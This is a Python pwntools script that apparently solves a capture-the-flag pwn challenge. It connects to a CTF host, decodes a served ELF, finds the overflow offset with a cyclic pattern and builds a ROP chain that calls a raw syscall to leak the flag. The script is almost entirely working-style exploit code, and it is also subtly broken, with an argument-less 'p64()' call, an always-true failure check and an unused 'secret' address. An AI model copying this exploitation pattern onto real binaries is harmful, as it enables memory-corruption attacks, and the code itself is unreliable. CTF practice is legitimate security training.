from pwn import *

def main():
    r = remote('surveillance.ctf', 8000)

    r.sendlineafter(b'Surveillance Proxy Password: ',
                    b"What I'm trying to do is to maximise the probability of the future being better")

    trash = r.recvline()
    print(trash)

    b64elf = r.recvline()[:-1]

    real_elf = b64d(b64elf)

    with open('challenge_elf', 'wb') as fp:
        fp.write(real_elf)

    st = os.stat('challenge_elf')
    os.chmod('challenge_elf', st.st_mode | stat.S_IEXEC)

    context.arch = 'amd64'
    context.binary = binary = ELF('./challenge_elf')

    rop = ROP([binary])

    POP_RAX_RET = rop.rax.address
    print(POP_RAX_RET)
    POP_RDI_RET = rop.rdi.address
    print(POP_RDI_RET)
    POP_RSI_RET = rop.rsi.address
    print(POP_RSI_RET)

    # 0x000000000041cd16 : syscall ; ret
    SYSCALL_RET = [rop.gadgets[gadget] for gadget in rop.gadgets if 'syscall' in rop.gadgets[gadget]['insns']][
        1].address
    print(SYSCALL_RET)
    POP_RDX_POP_RBX_RET = rop.rdx_rbx.address
    print(POP_RDX_POP_RBX_RET)
    MAX_BYTES_TO_READ = 0xff

    # Define the syscall numbers
    SYS_OPEN = 2
    SYS_READ = 0
    SYS_WRITE = 1

    # Define the buffer size for read
    BUF_SIZE = 0x100

    # Define the stdin and stdout file descriptors
    STDIN_FD = 0
    STDOUT_FD = 1

    # Prepare the 'secret' string address
    secret_addr = next(binary.search(b'secret'))
    p = process(['./challenge_elf'])
    p.sendline((b'1231112321' * 5)  + cyclic(5000))
    p.wait()
    core = p.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
    p.close()

    # gdb.attach(p, '''
    # b *0x0000000000401c58
    # ''')

    padding = rip_offset * b'A'
    # r.sendline(b'1')
    # r.sendline(b'2')
    # r.sendline(b'3')
    # r.sendline(b'4')
    # r.sendline(b'5')
    # print(r.recvline())

    # rop = ROP([binary])
    # rop.call('write', [1, p64(secret_addr), 0xff])
    #
    # print(rop.chain())

    payload = padding

    payload += p64(POP_RDI_RET) + p64()

    payload += p64(POP_RDI_RET) + p64(STDOUT_FD)
    payload += p64(POP_RSI_RET) + p64(3)
    payload += p64(POP_RDX_POP_RBX_RET) + p64(0) + p64(0)
    payload += p64(POP_RAX_RET) + p64(40)
    payload += p64(SYSCALL_RET)

    print('sending payload')
    r.sendline((b64e(b'0000000000' * 5) + payload))

    line = r.recvline()

    if b'flag' in line.lower():
        print(line)
        exit()

    if b'not going to work' or b'Invalid input' in line:
        print('not it')
        p.close()
        r.close()
    else:
        print(line)
        r.interactive()

if __name__ == '__main__':
    while True:
        main()
